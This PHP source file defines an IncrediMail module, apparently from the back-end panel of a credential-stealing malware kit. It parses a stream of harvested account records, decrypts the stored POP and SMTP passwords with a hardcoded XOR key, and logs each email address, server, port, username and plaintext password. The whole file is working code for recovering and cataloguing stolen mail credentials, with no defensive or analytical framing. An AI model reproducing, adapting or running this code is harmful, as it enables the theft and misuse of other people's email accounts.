<?php
class Module_incredimail extends Module_ //XOR
{
    private function Decrypt($Password)
    {
        $KEY_ = chr(0xb9).chr(0x02).chr(0xfa).chr(0x01);
        $DecPW = '';

        for ($i = 0; $i < strlen($Password); $i++)
        {
            $DecPW .= chr(ord($Password[$i]) ^ ord($KEY_[$i % strlen($KEY_)]));
        }

        return $DecPW;
    }
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
			case 0:
			{
				$stream = new Stream($Data, strlen($Data));

				while(TRUE)
				{
					$Email 		= $stream->getSTRING_();
					if($Email == NULL)
						break;
					
					$Prot 		= $stream->getSTRING_();
					
					$POPServer	= $stream->getSTRING_();
					$POPPort 	= $stream->getDWORD();
					$POPUser	= $stream->getSTRING_();
					$POPPass	= $this->Decrypt($stream->getBINARY_());
					
					$SMTPServer = $stream->getSTRING_();
					$SMTPPort	= $stream->getDWORD();
					$SMTPUser 	= $stream->getSTRING_();
					$SMTPPass 	= $this->Decrypt($stream->getBINARY_());

					if ($Prot == 'IMAP')
						$Prot = 'imap';
					else
						$Prot = 'pop3';
					
					$this->add_email($Email, $Prot, $POPServer, $POPPort, $POPUser, $POPPass);
					$this->add_email($Email, 'smtp', $SMTPServer, $SMTPPort, $SMTPUser, $SMTPPass);
				}

				break;
			}
        default:
            return FALSE;
        }

        return TRUE;
    }
}